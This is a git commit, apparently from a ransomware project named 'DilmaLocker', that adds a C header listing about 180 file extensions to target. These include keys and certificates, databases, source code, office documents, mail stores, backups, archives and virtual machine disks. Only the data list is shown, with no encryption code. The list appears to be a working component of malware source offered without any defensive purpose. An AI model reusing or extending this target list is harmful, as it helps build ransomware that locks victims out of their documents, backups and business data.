86cf1d411b8178a565c978ac8bb1bd8f37d95bb1
DilmaLocker <52313750+DilmaLocker@users.noreply.github.com>
2019-06-28 05:25:59 -0300

    Add files via upload

---
+++ src/header/extensions.h
@@ -0,0 +1,20 @@
+const LPWSTR extensionList[] =
+{
+	L".der", L".pfx", L".key", L".crt", L".csr", L".p12", L".pem", L".odt", L".ott", L".sxw", L".stw",
+	L".uot", L".3ds", L".max", L".3dm", L".ods", L".ots", L".sxc", L".stc", L".dif", L".slk", L".wb2",
+	L".odp", L".otp", L".sxd", L".std", L".uop", L".odg", L".otg", L".sxm", L".mml", L".lay", L".lay6",
+	L".asc", L".sqlite3", L".sqlitedb", L".sql", L".accdb", L".mdb", L".db", L".dbf", L".odb", L".frm",
+	L".myd", L".myi", L".ibd", L".mdf", L".ldf", L".sln", L".suo", L".cs", L".c", L".cpp", L".pas", L".h",
+	L".asm", L".js", L".cmd", L".bat", L".ps1", L".vbs", L".vb", L".pl", L".dip", L".dch", L".sch", L".brd",
+	L".jsp", L".php", L".asp", L".rb", L".java", L".jar", L".class", L".sh", L".mp3", L".wav", L".swf",
+	L".fla", L".wmv", L".mpg", L".vob", L".mpeg", L".asf", L".avi", L".mov", L".mp4", L".3gp", L".mkv",
+	L".3g2", L".flv", L".wma", L".mid", L".m3u", L".m4u", L".djvu", L".svg", L".ai", L".psd", L".nef",
+	L".tiff", L".tif", L".cgm", L".raw", L".gif", L".png", L".bmp", L".jpg", L".jpeg", L".vcd", L".iso",
+	L".backup", L".zip", L".rar", L".7z", L".gz", L".tgz", L".tar", L".bak", L".tbk", L".bz2", L".PAQ",
+	L".ARC", L".aes", L".gpg", L".vmx", L".vmdk", L".vdi", L".sldm", L".sldx", L".sti", L".sxi", L".602",
+	L".hwp", L".snt", L".onetoc2", L".dwg", L".pdf", L".wk1", L".wks", L".123", L".rtf", L".csv", L".txt",
+	L".vsdx", L".vsd", L".edb", L".eml", L".msg", L".ost", L".pst", L".potm", L".potx", L".ppam", L".ppsx",
+	L".ppsm", L".pps", L".pot", L".pptm", L".pptx", L".ppt", L".xltm", L".xltx", L".xlc", L".xlm", L".xlt",
+	L".xlw", L".xlsb", L".xlsm", L".xlsx", L".xls", L".dotx", L".dotm", L".dot", L".docm", L".docb", L".docx",
+	L".doc", NULL
+};
